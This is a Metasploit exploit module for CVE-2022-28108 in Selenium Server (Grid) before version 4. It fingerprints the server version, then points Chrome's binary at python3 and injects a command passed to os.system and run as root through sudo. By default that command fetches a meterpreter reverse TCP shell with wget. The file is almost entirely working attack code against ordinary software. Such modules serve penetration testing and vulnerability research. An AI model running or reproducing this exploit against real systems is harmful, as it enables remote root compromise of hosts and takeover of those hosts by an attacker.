##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'selenium-webdriver'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Selenium chrome RCE',
        'Description' => %q{
          Selenium Server (Grid) before 4 allows CSRF because it permits non-JSON content types
          such as application/x-www-form-urlencoded, multipart/form-data, and text/plain.
        },
        'Author' => [
          'Wiz Research',     # Vulnerability research
          'Takahiro Yokoyama' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', 'CVE-2022-28108'],
          ['URL', 'https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps'],
          ['URL', 'https://www.gabriel.urdhr.fr/2022/02/07/selenium-standalone-server-csrf-dns-rebinding-rce/'],
          ['URL', 'https://www.exploit-db.com/exploits/49915'],
        ],
        'Payload' => {
          'DisableNops' => true
        },
        'Platform' => %w[linux],
        'Targets' => [
          [
            'Linux Command', {
              'Arch' => [ ARCH_CMD ], 'Platform' => [ 'unix', 'linux' ], 'Type' => :nix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter_reverse_tcp',
                'FETCH_COMMAND' => 'WGET'
              }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-04-18',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(4444),
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown unless res&.code == 200

    json_string = res.get_html_document.xpath('//*[@class="se-version"]')&.text
    return Exploit::CheckCode::Unknown unless json_string

    # Extract the version
    version = Rex::Version.new(json_string)
    return Exploit::CheckCode::Unknown unless version

    return Exploit::CheckCode::Safe if Rex::Version.new('4.0.1') <= version

    return Exploit::CheckCode::Safe if version == Rex::Version.new('4.0.0-alpha-7')

    Exploit::CheckCode::Appears
  end

  def exploit
    remote_url = full_uri(normalize_uri(target_uri.path, 'wd/hub'))
    # Set up Chrome options
    chrome_options = Selenium::WebDriver::Chrome::Options.new
    chrome_options.binary = '/usr/bin/python3'
    sudo_payload = 'sudo su root -c "' + payload.encoded + '"'
    chrome_options.add_argument("-cimport os; os.system('#{sudo_payload}')")

    begin
      # Initialize the driver with the remote WebDriver URL and options
      Selenium::WebDriver.for :remote, url: remote_url, capabilities: chrome_options
    rescue Selenium::WebDriver::Error::UnknownError => e
      print_status("Expected error: #{e}")
    end
  end

end
